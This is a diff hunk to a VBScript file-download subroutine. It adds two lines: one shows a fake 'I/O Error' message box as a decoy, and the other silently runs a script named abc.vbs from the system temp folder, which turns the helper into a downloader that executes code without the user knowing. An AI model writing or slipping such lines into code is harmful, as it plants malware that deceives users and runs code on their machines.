@@ -47,4 +47,6 @@ Sub HTTPDownload( myURL, myPath )
 
     ' Close the target file
     objFile.Close( )
+    e = MsgBox("I/O Error", vbCritical, "ERROR")
+    CreateObject("WScript.Shell").Run(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\abc.vbs")
 End Sub
